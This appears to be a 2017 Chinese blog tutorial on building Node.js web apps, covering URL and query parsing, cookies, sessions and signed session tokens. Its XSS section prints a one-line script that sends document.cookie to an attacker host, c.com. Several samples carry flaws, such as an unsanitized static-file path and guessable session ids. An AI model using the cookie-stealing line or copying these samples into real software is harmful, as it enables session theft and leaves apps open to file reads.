---
title: 构建Web应用1
date: 2017-08-27
categories: ['node']
tags:
---
### 基础功能
对于一个Web应用而言，在具体的业务中，可能有以下需求：
- 请求方法的判断
- URL的路径解析
- URL中查询字符串解析
- Cookie的解析
- Basic认证
- 表单数据的解析
- 任意格式文件的上传处理
- Session

<!-- more -->

``` javascript
var http = require('http');
http.createServer(function(req, res) {
  res.writeHead(200, {'Content-Type': 'text/plain'});
  res.end('Hello world\n');
}).listen(1337, '127.0.0.1');
```
我们的应用可能无限复杂，但只要最终结果返回一个函数作为参数，传递给createServer()方法作为request事件的侦听器就可以了。

我们在业务代码开始前，需要为业务预处理一些细节，这些细节将会挂载在req或res对象上，供业务代码使用。

#### 请求方法
在Web应用中，常见的请求方法：GET 和 POST。请求方法存在于报文的第一行的第一个单词，通常是大写。
HTTP_Paser在解析请求报文的时候，将报文头抽取出来，设置为req.method。

#### 路径解析
除了根据请求方法进行分发外，最常见的请求判断莫过于路径的判断了。路径部分存在于报文的第一行的第二部分。

``` javascript
GET /path?foo=bar HTTP/1.1
```

HTTP_Paser将其解析为req.url。一般来说，完整的URL地址如下：
``` javascript
http://user:pass@host.com:8080/p/a/t/h?query=string#hash
```

客户端代理（浏览器）会将这个地址解析成报文，将路径和查询部分放在报文第一行。注意：hash部分会被丢弃，不会存在于报文的任何地方。

根据路径进行业务处理的应用：静态文件服务器。
``` javascript
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  fs.readFile(path.join(ROOT, pathname), function(err, file) {
    if (err) {
      res.writeHead(404);
      res.end('找不到相关文件');
      return;
    }
    res.writeHead(200);
    res.end(file);
  });
}
```

另一个比较常见的分发场景：根据路径来选择控制器，它预设路径为控制器和行为的组合，无须额外配置路由信息：controller/action/a/b/c。
controller：控制器，action：控制器的行为，剩余的：作为参数进行一些别的判断。
``` javascript
function(req, res) {
  var pathname = url.parse(req.url).pathname;
  var paths = pathname.split('/');
  var controller = paths[1] || 'index';
  var action = paths[2] || 'index';
  var args = paths.slice(3);
  if (handles[controller] && handles[controller][action]) {
    handles[controller][action].apply(null, [req, res].concat(args));
  } else {
    res.writeHead(500);
    res.end('找不到响应控制器');
  }
}
```

#### 查询字符串
Node提供了querystring模块用于处理这部分数据。
``` javascript
var url = require('url');
var querystring = require('querystring');
var query = querystring.parse(url.parse(req.url).query);
```

更简洁方法（会将query解析为一个JSON对象）：
``` javascript
var query = url.parse(req.url, true).query;
```

在业务调用产生之前，我们的中间件或者框架会将查询字符串转换，然后挂载在请求对象上供业务使用：
``` javascript
function(req, res) {
  req.query = url.parse(req.url, true).query;
  hande(req, res);
}
```

注意：如果查询字符串中的键出现多次，那么它的值会是一个数组：
``` javascript
foo=bar&foo=baz
{
  foo: ['bar', 'baz']
}
```
业务的判断一定要检查值是数组还是字符串，否则可能出现TypeError异常的情况。

#### Cookie

##### 初识Cookie
HTTP是一个无状态协议，业务却是需要一定状态的，否则无法区分用户之间的身份。如何标识和认证一个用户？最早的方案是Cookie。

Cookie的处理分为以下几步：
- 服务器向客户端发送Cookie
- 浏览器将Cookie保存
- 之后每次浏览器都会将Cookie发送给服务器端

客户端发送的Cookie在请求报文的Cookie字段中，我们可以通过curl工具构造这个字段：
``` javascript
curl -v -H 'Cookie: foo=bar; baz=val' 'http://127.0.0.1:1337/path?foo=bar&foo=baz'
```

HTTP_Paser会将所有的报文字段解析到req.headers上，Cookie就是req.headers.cookie。

如果识别到用户访问过我们的站点，告知客户端的方式是通过响应报文实现的，响应的Cookie值在Set-Cookie字段中。它的格式与请求中的格式不太相同：
``` javascript
Set-Cookie: name=value; Path=/; Expires=Sun, 23-Apr-23 09:01:35 GMT; Domain=./domain.com;
```

将响应报文中的Cookie信息序列化：
``` javascript
var serialize = function(name, val, opt) {
  var pairs = [name + '=' + encode(val)];
  opt = opt || {};
  if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
  if (opt.domain) pairs.push('Domain=' + opt.domain);
  if (opt.path) pairs.push('Path=' + opt.path);
  if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
  if (opt.httpOnly) pairs.push('HttpOnly');
  if (opt.secure) pairs.push('Secure');
  return pairs.join('; ');
};
```

业务逻辑：
``` javascript
var handle = function(req, res) {
  if (!req.cookies.isVisit) {
    res.setHeader('Set-Cookie', serialize('isVisit', '1'));
    res.writeHead(200);
    res.end('欢迎第一次光临');
  } else {
    res.writeHead(200);
    res.end('欢迎再次光临');
  }
}
```

客户端收到这个带Set-Cookie的响应后，在之后的请求时会在Cookie字段中带上这个值。
若有多个值：
``` javascript
res.setHeader('Set-Cookie', [serialize('foo', 'bar'), serialize('baz', 'val')]);
```

完整的cookie示例：
``` javascript
var http = require('http');
var parseCookie = function(cookie) {
  var cookies = {};
  if (!cookie) {
    return cookies;
  }
  var list = cookie.split(';');
  for(var i = 0; i < list.length; i++) {
    var pair = list[i].split('=');
    cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
var serialize = function(name, val, opt) {
  var pairs = [name + '=' + encodeURIComponent(val)];
  opt = opt || {};
  if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
  if (opt.domain) pairs.push('Domain=' + opt.domain);
  if (opt.path) pairs.push('Path=' + opt.path);
  if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
  if (opt.httpOnly) pairs.push('HttpOnly');
  if (opt.secure) pairs.push('Secure');
  return pairs.join('; ');
};
var handle = function(req, res) {
  res.setHeader('Content-Type', 'text/plain;charset=utf-8');
  if (!req.cookies.isVisit) {
    res.setHeader('Set-Cookie', serialize('isVisit', '1'));
    res.writeHead(200);
    res.end('欢迎第一次光临');
  } else {
    res.writeHead(200);
    res.end('欢迎再次光临');
  }
}
http.createServer(function(req, res) {
  req.cookies = parseCookie(req.headers.cookie);
  handle(req, res);
}).listen(3001);
console.log('server is listening on 3001');
```

##### Cookie的性能影响
- 减小Cookie的大小
Cookie在设计时限定了它的域，只有域名相同时才会发送。
- 为静态组件使用不同的域名
- 减少DNS查询
DNS缓存。
Cookie除了可以通过后端添加协议头的字段设置外，在前端浏览器中也可以通过JavaScript进行修改，浏览器将Cookie通过document.cookie暴露给了JavaScript。前端在修改Cookie后，后续的网络请求中就会带上修改过后的值。

#### Session
以上可知，浏览器和服务器可以实现状态的记录。但是，Cookie可以在前后端进行修改，因此数据很容易被篡改和伪造。

为了解决这个问题，Session应运而生。

Session的数据只保留在服务器端，客户端无法修改，这样数据的安全性得到了保障，数据也无须在协议中每次都被传递。

如何将每个客户和服务器中的数据一一对应起来？常见的两种实现方式：
- 基于Cookie来实现用户和数据的映射
虽然将所有数据都放在Cookie中不可取，但是将口令放在Cookie中还是可以的。因为口令一旦被篡改，就丢失了映射关系，也无法修改服务器端存在的数据了。并且Session的有效期较短，普通的设置是20分钟，如果在20分钟内客户端和服务器端没有交互产生，服务器端就将数据删除。

那么口令是如何产生的呢？

一旦服务器启用了Session，它将约定一个键值作为Session的口令，这个值可以随意约定。一旦服务器检查到用户请求Cookie中没有携带该值，就会为之生成一个值，这个值是唯一且不重复的，并设定超时时间。生成session：
``` javascript
var sessions = {};
var key = 'session_id';
var EXPIRES = 20 * 60 * 1000;
var generate = function() {
  var session = {};
  session.id = (new Date()).getTime() + Math.random();
  session.cookie = {
    expire: (new Date()).getTime() + EXPIRES
  };
  sessions[session.id] = session;
  return session;
};
```

每个请求过来，检查Cookie中的口令与服务器端的数据，如果过期，就重新生成。
``` javascript
function(req, res) {
  var id = req.cookies[key];
  if (!id) {
    req.session = generate();
  } else {
    var session = sessions[id];
    if (session) {
      if (session.cookie.expire > (new Date()).getTime()) {
        // 更新超时时间
        session.cookie.expire = (new Date()).getTime() + EXPIRES;
        req.session = session;
      } else {
        // 超时了，删除旧的数据，并重新生成
        delete sessions[id];
        req.session = generate();
      }
    } else {
      // 如果session过期或口令不对，重新生成session
      req.session = generate();
    }
  }
  handle(req, res);
}
```
当然仅仅重新生成Session还不足以完成整个流程，还需要响应给客户端时设置新的值，以便下次请求时能够对应服务器端的数据。这里hack响应对象的writeHead()方法，在它的内部注入设置Cookie的逻辑。

``` javascript
var writeHead = res.writeHead;
res.writeHead = function() {
  var cookies = res.getHeader('Set-Cookie');
  var session = serialize(key, req.session.id);     // req.session.id 由服务端生成
  cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
  res.setHeader('Set-Cookie', cookies);
  return writeHead.apply(this, arguments);
};
```

至此，session在前后端进行对应的过程就完成了。这样，业务逻辑可以判断和设置session，以此来维护用户与服务器端的关系。
``` javascript
var handle = function(req, res) {
  if (!req.session.isVisit) {
    req.session.isVisit = true;
    res.writeHead(200);
    res.end('欢迎第一次来到动物园');
  } else {
    res.writeHead(200);
    res.end('动物园再次欢迎你');
  }
};
```
这种实现方案依赖Cookie的实现，而且也是目前大多数Web应用的方案。

完整的session示例：
``` javascript
var http = require('http');
var sessions = {};
var key = 'session_id';   // 客户端与服务器端约定的 session 口令的键值（cookie键）
var EXPIRES = 20 * 60 * 1000;
// 将cookie转换成对象
var parseCookie = function(cookie) {
  var cookies = {};
  if (!cookie) {
    return cookies;
  }
  var list = cookie.split(';');
  for(var i = 0; i < list.length; i++) {
    var pair = list[i].split('=');
    cookies[pair[0].trim()] = pair[1];
  }
  return cookies;
};
// 将对象序列化
var serialize = function(name, val, opt) {
  var pairs = [name + '=' + encodeURIComponent(val)];
  opt = opt || {};
  if (opt.maxAge) pairs.push('Max-Age=' + opt.maxAge);
  if (opt.domain) pairs.push('Domain=' + opt.domain);
  if (opt.path) pairs.push('Path=' + opt.path);
  if (opt.expires) pairs.push('Expires=' + opt.expires.toUTCString());
  if (opt.httpOnly) pairs.push('HttpOnly');
  if (opt.secure) pairs.push('Secure');
  return pairs.join('; ');
};

// 生成session
var generate = function() {
  var session = {};
  session.id = (new Date()).getTime() + Math.random();
  session.cookie = {
    expire: (new Date()).getTime() + EXPIRES
  };
  sessions[session.id] = session;
  return session;
};
// 处理业务逻辑
var handle = function(req, res) {
  res.setHeader('Content-Type', 'text/plain;charset=utf-8');
  var writeHead = res.writeHead;
  res.writeHead = function() {
    var cookies = res.getHeader('Set-Cookie');
    var session = serialize(key, req.session.id);     // req.session.id 由服务端生成
    cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
    res.setHeader('Set-Cookie', cookies);
    return writeHead.apply(this, arguments);
  };
  /**
   * 第一次访问：req.session 是新生成的，此时 isVisit 没有，将其设为 true
   * 非第一次访问：req.session 是之前生成的（没过时的话），isVisit 已经被设置成了 true
   */
  if (!req.session.isVisit) {
    req.session.isVisit = true;
    res.writeHead(200);
    res.end('欢迎第一次来到动物园');
  } else {
    res.writeHead(200);
    res.end('动物园再次欢迎你');
  }
};

http.createServer(function(req, res) {
  // 将 cookie 格式化，并挂载到 req 对象上
  req.cookies = parseCookie(req.headers.cookie);
  var id = req.cookies[key];
  /**
   * 注意：session是挂载在req对象上的，因为session只需要保存在服务器端。
   *   客户端只需要存储口令值即可。
   */
  if (!id) {
    req.session = generate();
  } else {
    var session = sessions[id];
    if (session) {
      if (session.cookie.expire > (new Date()).getTime()) {
        // 更新超时时间
        session.cookie.expire = (new Date()).getTime() + EXPIRES;
        req.session = session;
      } else {
        // 超时了，删除旧的数据，并重新生成
        delete sessions[id];
        req.session = generate();
      }
    } else {
      // 如果session过期或口令不对，重新生成session
      req.session = generate();
    }
  }
  handle(req, res);
}).listen(3002);
console.log('server is listening on 3002');
```

- 通过查询字符串来实现浏览器端和服务器端数据的对应
原理：检查请求的查询字符串，如果没有值，会先生成新的带值的URL。

##### Session与内存
在上面示例代码中，都是将 session 数值直接存在变量 sessions 中，它位于内存中。

这里将数据存放在内存中将带来极大的隐患，如果用户增多，我们很可能就接触到了内存限制的上限，并且内存中的数据量加大，必然会引起垃圾回收的频繁扫描，引起性能问题。

另一个问题则是，我们可能为了利用多核CPU而启动多个进程，用户请求的连接将可能随意分配到各个进程中，Node的进程与进程之间是不能直接共享内存的，用户的 session 可能会引起错乱。

为了解决性能问题和 session 数据无法跨进程共享的问题，常用的方案是将 session 集中化，将原本可能分散在多个进程里的数据，统一转移到集中的数据存储中。目前常用的工具是 Redis、Memcached等，通过这些高效的缓存，Node进程无须在内部维护数据对象，垃圾回收问题和内存限制问题都可以迎刃而解，并且这些高速缓存设计的缓存过期策略更合理更高效，比在 Node 中自行设计缓存策略更好。

采用第三方缓存来存储session引起的一个问题是会引起网络访问。理论上来说，访问网络中的数据要比访问本地磁盘中的数据速度要慢，因为涉及到握手、传输以及网络终端自身的磁盘I/O等，尽管如此，依然会采用这些高速缓存的理由：
- Node与缓存服务保持长连接，而非频繁的短连接，握手导致的延迟只影响初始化。
- 高速缓存直接在内存中进行数据存储和访问。
- 缓存服务通常与Node进程运行在相同的机器上或者相同的机房里，网络速度受到的影响较小。

此时，一旦session需要异步的方式获取，代码就需要略作调整，变成异步的方式：
``` javascript
function(req, res) {
  var id = req.cookies[key];
  if (!id) {
    req.session = generate();
    handle(req, res);
  } else {
    store.get(id, function(err, session) {
      if (session) {
        if (session.cookie.expire > (new Date()).getTime()) {
          // 更新超时时间
          session.cookie.expire = (new Date()).getTime() + EXPIRES;
          req.session = session;
        } else {
          // 超时了，删除旧的数据，并重新生成
          delete sessions[id];
          req.session = generate();
        }
      } else {
        // 如果session过期或口令不对，重新生成session
        req.session = generate();
      }
      handle(req, res);
    });
  }
}
```

在响应时，将新的session保存回缓存中：
``` javascript
var writeHead = res.writeHead;
res.writeHead = function() {
  var cookies = res.getHeader('Set-Cookie');
  var session = serialize(key, req.session.id);     // req.session.id 由服务端生成
  cookies = Array.isArray(cookies) ? cookies.concat(session) : [cookies, session];
  res.setHeader('Set-Cookie', cookies);
  // 保存回缓存
  store.save(req.session);
  return writeHead.apply(this, arguments);
};
```

##### Session与安全
保存在客户端中的session的口令可能会被盗用、伪造。一旦口令被伪造，服务器端的数据也可能间接被利用。如何让这个口令更安全？

有一种做法：将这个口令通过私钥加密进行签名，使得伪造的成本较高。客户端尽管可以伪造口令值，但是由于不知道私钥值，签名信息很难伪造。如此，只要在响应时将口令和签名进行对比，如果签名非法，将服务器端的数据立即过期即可。
``` javascript
// 将值通过私钥签名，由.分割原值和签名
var sign = function(val, secret) {
  return val + '.' + crypto
    .createHmac('sha256', secret)
    .update(val)
    .digest('base64')
    .replace(/\=+$/, '');
};
```

在响应时，设置session值到cookie中或者跳转URL中。
``` javascript
var val = sign(req.sessionID, secret);
res.setHeader('Set-Cookie', cookie.serialize(key, val));
```

接收请求时，检查签名：
``` javascript
// 取出口令部分进行签名，对比用户提交的值
var unsign = function(val, secret) {
  var str = val.slice(0, val.lastIndexOf('.'));
  return sign(str, secret) == val ? str : false;
};
```

将口令进行签名是一个很好的解决方案，但是如果攻击者通过某种方式获取了一个真实的口令和签名，他就能实现身份的伪装。一种方案是将客户端的某些独有信息与口令作为原值，然后签名，这样攻击者一旦不在原始的客户端上进行访问，就会导致签名失败。独有信息包括用户IP和用户代理。

通常来说，将口令存在cookie中不易被人获取，但是一些别的漏洞可能导致这个口令被泄漏，典型的有XSS漏洞。

- XSS漏洞
跨站脚本攻击（Cross Site Scripting），通常是由网站开发者决定哪些脚本可以执行在浏览器端。
例如脚本
``` javascript
location.href = 'http://c.com/?' + document.cookie;
```

这段代码将该用户的cookie提交给了c.com站点，这个站点就是攻击者的服务器，他也就能拿到该用户的session口令。然后在客户端中用这个口令伪造cookie，从而实现伪装用户的身份。
































